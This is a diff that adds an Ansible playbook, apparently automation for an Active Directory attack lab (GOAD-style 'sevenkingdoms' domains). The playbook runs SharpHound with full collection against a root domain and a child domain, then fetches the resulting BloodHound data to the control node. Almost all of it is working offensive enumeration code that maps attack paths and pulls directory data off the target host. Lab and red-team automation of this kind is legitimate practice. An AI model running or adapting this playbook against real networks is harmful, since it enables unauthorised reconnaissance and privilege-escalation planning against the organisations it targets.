@@ -1,0 +1,86 @@
+- name: Run Phase 3 Attack 01 BloodHound enumeration
+  hosts: braavos
+  gather_facts: false
+  tasks:
+    - name: Run SharpHound for root and child domains
+      ansible.windows.win_powershell:
+        script: |
+          $ErrorActionPreference = "Continue"
+          $ProgressPreference = "SilentlyContinue"
+
+          $attackDir = 'C:\attacks'
+          $sharpHound = Join-Path $attackDir 'SharpHound.exe'
+          $rootOut = Join-Path $attackDir 'bloodhound-sevenkingdoms'
+          $northOut = Join-Path $attackDir 'bloodhound-north'
+
+          New-Item -ItemType Directory -Path $rootOut -Force | Out-Null
+          New-Item -ItemType Directory -Path $northOut -Force | Out-Null
+
+          if (-not (Test-Path -Path $sharpHound)) {
+            throw "SharpHound.exe not found at $sharpHound"
+          }
+
+          Write-Output "SharpHound path: $sharpHound"
+          $file = Get-Item -Path $sharpHound
+          Write-Output ("SharpHound size: {0} bytes" -f $file.Length)
+
+          $runs = @(
+            @{
+              Name = 'sevenkingdoms.local'
+              Domain = 'sevenkingdoms.local'
+              OutputDirectory = $rootOut
+            },
+            @{
+              Name = 'north.sevenkingdoms.local'
+              Domain = 'north.sevenkingdoms.local'
+              OutputDirectory = $northOut
+            }
+          )
+
+          foreach ($run in $runs) {
+            Write-Output "=== SharpHound run: $($run.Domain) ==="
+            Push-Location $attackDir
+            try {
+              $args = @(
+                '-c', 'All',
+                '-d', $run.Domain,
+                '--OutputDirectory', $run.OutputDirectory
+              )
+              Write-Output ("Command: .\SharpHound.exe {0}" -f ($args -join ' '))
+              & $sharpHound @args 2>&1 | ForEach-Object { Write-Output $_ }
+              Write-Output "SharpHound exit code for $($run.Domain): $LASTEXITCODE"
+            } catch {
+              Write-Output "ERROR running SharpHound for $($run.Domain): $($_.Exception.Message)"
+            } finally {
+              Pop-Location
+            }
+          }
+
+          Write-Output "=== Output files ==="
+          Get-ChildItem -Path $rootOut,$northOut -Recurse -Force |
+            Select-Object FullName,Length,LastWriteTime |
+            Format-Table -AutoSize |
+            Out-String -Width 260
+
+    - name: Find BloodHound output files
+      ansible.windows.win_find:
+        paths:
+          - C:\attacks\bloodhound-sevenkingdoms
+          - C:\attacks\bloodhound-north
+        patterns:
+          - '*.zip'
+          - '*.json'
+          - '*.bin'
+        recurse: true
+      register: bloodhound_outputs
+
+    - name: Fetch BloodHound output files to control node
+      ansible.builtin.fetch:
+        src: "{{ item.path }}"
+        dest: /tmp/phase3-attack01/
+        flat: true
+      loop: "{{ bloodhound_outputs.files }}"
+
+    - name: Show fetched BloodHound files
+      ansible.builtin.debug:
+        msg: "{{ bloodhound_outputs.files | map(attribute='path') | list }}"
